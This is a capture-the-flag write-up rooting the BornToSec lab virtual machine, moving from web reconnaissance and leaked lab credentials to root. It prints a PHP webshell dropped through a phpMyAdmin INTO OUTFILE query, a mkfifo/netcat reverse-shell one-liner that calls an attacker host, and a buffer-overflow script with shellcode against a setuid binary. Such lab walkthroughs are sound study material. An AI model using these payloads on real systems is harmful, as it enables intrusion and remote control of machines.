# Writeup1
**First way to become root**

---

## Objective

This writeup documents the full exploitation chain of the BornToSec virtual machine.
The goal is to escalate privileges from an unauthenticated user to **root** by chaining web vulnerabilities, credential reuse, reverse shell access, binary challenges, and a buffer overflow.

Full exploitation chain: `web (lmezard) -> laurie (SSH) -> thor -> zaz -> root`

---

- [Writeup1](#writeup1)
	- [Objective](#objective)
	- [1. Reconnaissance](#1-reconnaissance)
		- [1.1 Scan IP](#11-scan-ip)
		- [1.2 Network Scan](#12-network-scan)
		- [1.3 Website](#13-website)
	- [2. Exploitation](#2-exploitation)
		- [2.1 Credential Leak (Forum) - https://ip/forum](#21-credential-leak-forum---httpsipforum)
		- [2.2 Webmail Access - https://ip/webmail](#22-webmail-access---httpsipwebmail)
		- [2.3 phpMyAdmin Access - https://ip/phpmyadmin](#23-phpmyadmin-access---httpsipphpmyadmin)
	- [3. Reverse Shell](#3-reverse-shell)
		- [3.1 Listener Setup (Attacker Machine)](#31-listener-setup-attacker-machine)
		- [3.2 Connection from Target](#32-connection-from-target)
		- [3.3 Shell Connection](#33-shell-connection)
		- [3.4 Files Exploitation](#34-files-exploitation)
	- [4. SSH Connection](#4-ssh-connection)
		- [4.1 lmezard to laurie](#41-lmezard-to-laurie)
		- [4.2 Laurie's Session](#42-lauries-session)
		- [Phase\_1](#phase_1)
			- [result](#result)
		- [Phase\_2](#phase_2)
			- [result](#result-1)
		- [Phase\_3\`](#phase_3)
			- [result](#result-2)
		- [Phase\_4](#phase_4)
			- [result](#result-3)
		- [Phase\_5](#phase_5)
			- [result](#result-4)
		- [Phase\_6](#phase_6)
			- [result](#result-5)
			- [Final Result](#final-result)
	- [4.3 Thor's Session](#43-thors-session)
	- [4.4 Zaz's Session](#44-zazs-session)
		- [Finding the Offset](#finding-the-offset)
		- [Analysis](#analysis)
		- [Exploitation](#exploitation)
		- [Getting a Root Shell](#getting-a-root-shell)
		- [Verification](#verification)
	- [Users Information](#users-information)
	- [Conclusion](#conclusion)
	- [REF](#ref)

---

## 1. Reconnaissance

> The goal of this phase is to identify the target machine on the network and enumerate its exposed services and web paths.

### 1.1 Scan IP

```bash
ip addr
# -> inet 192.168.1.146/24
```

### 1.2 Network Scan

```bash
# Active machine detection on local network
nmap -sn 192.168.1.0/24 -oA scan.txt

# Full port scan on identified target
nmap -p- 192.168.1.146
```

| Port | Service | Description            |
|------|---------|------------------------|
| 21   | FTP     | File Transfer Protocol |
| 22   | SSH     | Secure Shell           |
| 80   | HTTP    | Web Server             |
| 143  | IMAP    | Mail Access            |
| 443  | HTTPS   | Secure Web             |
| 993  | IMAPS   | Secure IMAP            |

### 1.3 Website

> Note: the target IP may appear as `192.168.1.64` in some outputs. Both refer to the same machine depending on network configuration at the time of the test.

![alt](./img/website.png)

Directory bruteforce with gobuster to discover hidden paths:

```bash
gobuster dir -u https://192.168.1.146/ -w common.txt -k -x php,bak,txt,sql
```

Interesting paths found:

```
/forum        (Status: 301) [--> https://192.168.1.64/forum/]
/phpmyadmin   (Status: 301) [--> https://192.168.1.64/phpmyadmin/]
/webmail      (Status: 301) [--> https://192.168.1.64/webmail/]
```

---

## 2. Exploitation

> This phase chains three web services to recover valid database credentials.

### 2.1 Credential Leak (Forum) - https://ip/forum

> The forum must be accessed via HTTPS, not HTTP.

```bash
# Warning: use https:// not http://
```

A forum post titled **"Problem login ?"** contains debug logs where a user accidentally typed their password in the username field:

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

![alt](./img/login.png)

Credentials recovered:
- **User:** `lmezard`
- **Password:** `!q\]Ej?*5K5cy*AJ`

Logging in to the forum with these credentials works. The profile reveals lmezard's email address (see [Users Information](#users-information)).

### 2.2 Webmail Access - https://ip/webmail

![alt](img/webmail_log.png)

> Users often reuse passwords across services. The same password from the forum is tested here.

Login credentials:
- **Email:** `laurie@borntosec.net`
- **Password:** `!q\]Ej?*5K5cy*AJ`

A mail in the inbox contains database credentials:

![alt](img/mail.png)

```
User: root
Password: Fg-'kKXBj87E:aJ$
```

### 2.3 phpMyAdmin Access - https://ip/phpmyadmin

> With database root access, we can write files to the web server, which allows us to deploy a webshell.

1. Navigate to `https://192.168.1.146/phpmyadmin/` and log in with the recovered credentials.

2. The database `forum_db.mlf2_userdata` contains user records including password hashes.

   Password hashes could not be reversed by standard means. However, since we know lmezard's plaintext password, we can compute its hash and **copy it to the admin account**. This grants us admin access to the forum panel, where we can identify writable PHP template paths that are safe to write to — a necessary step before using `INTO OUTFILE` to drop a webshell onto the server.

   ![alt](img/Admin_forum.png)
   ![alt](img/update_forum.png)
   ![alt](img/template_c.png)

3. Write a webshell to a writable path via SQL query:

```sql
SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET[''cmd'']) { system($_GET[''cmd'']);} ?> </pre></BODY></HTML>'
INTO OUTFILE "/var/www/forum/templates_c/cmd.php"
```

---

## 3. Reverse Shell

> The webshell gives us command execution on the server. We upgrade it to a full reverse shell for interactive access.

### 3.1 Listener Setup (Attacker Machine)

Start a netcat listener on the attacker machine:

```bash
nc -lvnp 1234
```

### 3.2 Connection from Target

Navigate to `https://<ip>/forum/templates_c/cmd.php` and execute the following command.

> Note: `Attacker_IP` is the IP address of your machine (the one running the listener), not the target's IP.

![alt](img/etc_passwd.png)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc Attacker_IP 1234 >/tmp/f
```

### 3.3 Shell Connection

The listener receives the connection:

```bash
Listening on 0.0.0.0 1234
Connection received on 192.168.1.64 54543
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ find / -user www-data 2>/dev/null
```

The `su` command fails in a non-TTY shell. A readable file reveals lmezard's password:

```bash
cat /home/LOOKATME/password
# lmezard:G!@M6f4Eatau{sF"
su lmezard
>> su: must be run from a terminal
```

with a research on [internet](https://unix.stackexchange.com/questions/594264/error-su-must-be-run-from-a-terminal?__cf_chl_tk=.M.TvcaACsdi9g3YQYNf2kmx6stuQibrlhF7rA6zHQ0-1782222640-1.0.1.1-DY6ddXZzuy2MR7gNUHQnMudBNiy6mAtwy_Sat_SO_EE) we found : ``python -c 'import pty; pty.spawn("/bin/sh")'``


Upgrade to a proper TTY using Python, then switch user:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
su lmezard
Password: G!@M6f4Eatau{sF"
lmezard@BornToSecHackMe:/var/www/forum/templates_c$ cd ~
lmezard@BornToSecHackMe:~$ ls
fun  README
lmezard@BornToSecHackMe:~$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

### 3.4 Files Exploitation

> The `fun` archive contains a scrambled C program. Reassembling it reveals a password.

Copy the archive to a web-accessible path to download it:

```bash
lmezard@BornToSecHackMe:~$ chmod 777 fun
lmezard@BornToSecHackMe:~$ cp fun /var/www/forum/templates_c/
```

1. Navigate to `https://192.168.1.146/forum/templates_c/` and download the `fun` file.
2. Extract the archive.

The archive contains many files in shuffled order. Grepping for return values across all files:

```bash
cat * | grep return
# file483    return 'a';
# file697    return 'I';
#            return 'w';
#            return 'n';
# ...
# file3    return 'h';
```

The entry point is `file1` which includes `#include <stdio.h>`. The `main` function calls `getme1()` through `getme12()`:

```c
int main() {
    printf("MY PASSWORD IS: ");
    printf("%c", getme1());
    printf("%c", getme2());
    // ... up to getme12()
    printf("\n");
    printf("Now SHA-256 it and submit");
}
```

Each `getme` function is defined across multiple files. To find `getme1()`, locate the file containing its body — follow the `//fileN` comments to find the closing brace with the return value.

We did that for every getme until getme8(), that gave us :

```
Iheartpwnage
```

SHA-256 hash:

```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

---

## 4. SSH Connection

### 4.1 lmezard to laurie

The README instructed us to use the SHA-256 result as laurie's SSH password:

```bash
ssh laurie@192.168.1.146
Password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
laurie@BornToSecHackMe:~$ ls
README  bomb
```

### 4.2 Laurie's Session

> The `bomb` binary requires solving 6 sequential phases. A wrong answer detonates the bomb (exits). We use Ghidra to reverse each phase.

The main function calls each phase in order. See [reverse_bomb.txt](./scripts/bomb/reverse_bomb.txt).


### Phase_1

The phase_1 is easy, it's just a simple strings_not_equal. The except result is write clearly : "Public speaking is very easy."
#### result
``Public speaking is very easy.``

### Phase_2

there is 2 functions for this phase.
`read_six_numbers` is to verify there is 6 numbers in the input and copy it in this var : int code [7];

To solve this sequence of 6 number. It's really short so could resolve by mind:
code[i + 1] = (i + 1) * code[i]

#### result

``1 2 6 24 120 720``

### Phase_3`

It's switch case, we understood local_10 will be the case. local_9 is a char and it's cVar2. And local_8 should be  equal to hexa if (local_8 != Hexa).
> we remember the hint: the char == b.

So there is 3 possibility 


#### result


res_1 : case 1 = ``1 b 214``
res_2 : case 2 = ``2 b 755``
res_3 : case 3 = ``7 b 524``

### Phase_4
It's recursive function so rewrite in c to have the result cf [phase_4.c](./scripts/bomb/phase4.c)
#### result
``9``
### Phase_5

We search what correspond array on ghidra : *isrveawhobpnutfg* and
We create a [program](./scripts/bomb/phase5.c) to resolve it. 

#### result
opekma
### Phase_6

We write the phase6 from ghidra in a clear way. We find the chqin list and we resolve this puzzle.
cf [phase6.c](./scripts/bomb/phase5.c)


#### result

4 2 6 3 1 5

#### Final Result

We remember the README, we remove the space and we found 3 solutions:
``Publicspeakingisveryeasy.126241207201b2149opekma426315``
``Publicspeakingisveryeasy.126241207202b7559opekma426315``
``Publicspeakingisveryeasy.126241207207b5249opekma426315``

none of them works because there is a problem. In the subject there is 
![problem](./img/problen_in_the_subject.png)

The result is ``Publicspeakingisveryeasy.126241207201b2149opekmq426135``

---

## 4.3 Thor's Session

> Thor's home contains a `turtle` file with Logo language drawing instructions. The drawn shape spells a word, which must be MD5-hashed to get zaz's password.

```bash
ssh thor@192.168.1.146
Password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
thor@BornToSecHackMe:~$ ls
README  turtle
```

In the *home* of **thor** there is a README and turtle file. 
We understood it's a logo language, and turtle is use to draw.
We found http://www.logointerpreter.com/turtle-editor.php , we replace the instruction like **Avance** by **fd**, etc...

[Script turtle](./scripts/thor/turtle)

![solution](./img/SLASH.png)

We md5 SLASH to use for **zaz**'s session.

result :  ``646da671ca01bb5d84dbb5fb2238dc8e``

---

## 4.4 Zaz's Session

> Zaz owns a SUID binary `exploit_me` that uses `strcpy` without bounds checking, making it vulnerable to a classic stack buffer overflow. Since the binary is SUID root, a successful exploit spawns a root shell.

Reference: https://www.samsclass.info/127/proj/p3-lbuf1.htm

```bash
ssh zaz@192.168.1.146
Password: 646da671ca01bb5d84dbb5fb2238dc8e
zaz@BornToSecHackMe:~$ ls
exploit_me  mail
```

### Finding the Offset

Confirm the stack is executable (RWE flag):

```bash
zaz@BornToSecHackMe:~$ readelf -l ./exploit_me | grep GNU_STACK
GNU_STACK  0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

Build a first payload to locate EIP:

```bash
vim p.py
```

```python
#!/usr/bin/python2

nopsled  = '\x90' * 64
shellcode = (
    '\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2'
    '\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89'
    '\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
)
padding = 'A' * (140 - 64 - 32)
eip = '1234'
print nopsled + shellcode + padding + eip
```

```bash
python2 p.py > test
chmod 777 test
```

### Analysis

Disassemble `main` with gdb to find the vulnerable `strcpy` call and identify the buffer address:

```bash
gdb ./exploit_me
(gdb) disas main
```

Relevant output:

```
0x08048419 <+37>:  lea    0x10(%esp),%eax
0x0804841d <+41>:  mov    %eax,(%esp)
0x08048420 <+44>:  call   0x8048300 <strcpy@plt>
0x08048425 <+49>:  lea    0x10(%esp),%eax   <-- address of buffer (strcpy destination)
```

Set a breakpoint and run:

```bash
(gdb) b *0x08048425
(gdb) run $(cat test)
```

Inspect the stack:

```bash
(gdb) x/40x $esp
0xbffff520: 0xbffff530  0xbffff7b3  ...
0xbffff530: 0x90909090  0x90909090  ...   <-- NOP sled starts here
0xbffff570: 0xc389c031  0x80cd17b0  ...   <-- shellcode
0xbffff590: 0x41414141  0x41414141  ...   <-- padding
0xbffff5b0: 0x41414141  0x34333231  ...   <-- EIP overwrite ('1234')
```

### Exploitation

Replace EIP with an address pointing into the NOP sled. The sled starts at `0xbffff530`. A safe target in the middle of the sled:

```
0xbffff550
```

In little-endian (x86 stores the least significant byte first):

```python
eip = '\x50\xf5\xff\xbf'
```

Final exploit:

```python
#!/usr/bin/python2

nopsled  = '\x90' * 64
shellcode = (
    '\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2'
    '\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89'
    '\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
)
padding = 'A' * (140 - 64 - 32)
eip = '\x50\xf5\xff\xbf'   # 0xbffff550 in little-endian
print nopsled + shellcode + padding + eip
```

```bash
python2 p.py > test
```

Verify in gdb:

```bash
(gdb) b *0x08048425
(gdb) run $(cat test)
(gdb) x/40x $esp
# ...
0xbffff5b0: 0x41414141  0x41414141  0x41414141  0xbffff550  <-- EIP now points into the NOP sled
(gdb) c
# /bin/dash executes (may show a relocation error inside gdb, which is normal)
```

### Getting a Root Shell

Run outside gdb (ASLR is disabled on this machine, so addresses are stable):

```bash
./exploit_me $(cat test)
```

```bash
# whoami
root
```

### Verification

```bash
cd /root
cat README
```

```
CONGRATULATIONS !!!!
To be continued...
```

---

## Users Information

| Username  | Type  | UID  | E-mail                   | Forum/DB password            | SSH password                                                           |
|-----------|-------|------|--------------------------|------------------------------|-----------------------------------------------------------------------|
| root      | root  | 0    | root@mail.borntosec.net  | `Fg-'kKXBj87E:aJ$`           |                                                                       |
| admin     | Admin | 1000 | admin@borntosec.net      |                              |                                                                       |
| lmezard   | User  | 1040 | laurie@borntosec.net     | `!q\]Ej?*5K5cy*AJ` / `G!@M6f4Eatau{sF"` | 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4 |
| thor      | User  |      | thor@borntosec.net       |                              | Publicspeakingisveryeasy.126241207201b2149opekmq426135               |
| zaz       | User  |      | zaz@borntosec.net        |                              | 646da671ca01bb5d84dbb5fb2238dc8e                                     |
| qudevide  | User  |      | qudevide@borntosec.net   |                              |                                                                       |
| wandre    | User  |      | wandre@borntosec.net     |                              |                                                                       |

---

## Conclusion

The full exploitation chain from unauthenticated access to root:

1. **Forum** - Debug logs leaked lmezard's credentials (password typed in username field)
2. **Webmail** - Credential reuse gave access to laurie's inbox containing DB root credentials
3. **phpMyAdmin** - DB access allowed writing a PHP webshell to the server
4. **Reverse shell** - Webshell used to spawn a reverse shell as `www-data`, then pivoted to `lmezard`
5. **fun archive** - Scrambled C program reassembled to recover laurie's SSH password (SHA-256)
6. **bomb binary** - Six reverse-engineering phases solved with Ghidra to recover thor's password
7. **turtle file** - Logo drawing instructions decoded the word SLASH (MD5 = zaz's password)
8. **Buffer overflow** - SUID binary `exploit_me` exploited via stack overflow + shellcode to spawn a root shell

---

## REF

- NMAP:
  - https://nmap.org/book/port-scanning-tutorial.html
  - https://www.varonis.com/fr/blog/nmap-commands#how-to-use
- GOBUSTER:
  - https://hackviser.com/tactics/tools/gobuster
  - https://github.com/drtychai/wordlists/blob/master/dirb/common.txt
- Reverse shell:
  - https://medium.com/@toon.commander/uploading-a-shell-in-phpmyadmin-61b066b481a7
  - https://www.netspi.com/blog/technical-blog/network-pentesting/linux-hacking-case-studies-part-3-phpmyadmin/
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- mkfifo:
  - http://manpagesfr.free.fr/man/man3/mkfifo.3.html
- su problem:
  - https://unix.stackexchange.com/questions/594264/error-su-must-be-run-from-a-terminal
- Buffer overflow:
  - https://www.samsclass.info/127/proj/p3-lbuf1.htm
  - https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558
  - https://www.youtube.com/watch?v=Uk-xv8uxiJo&t=134s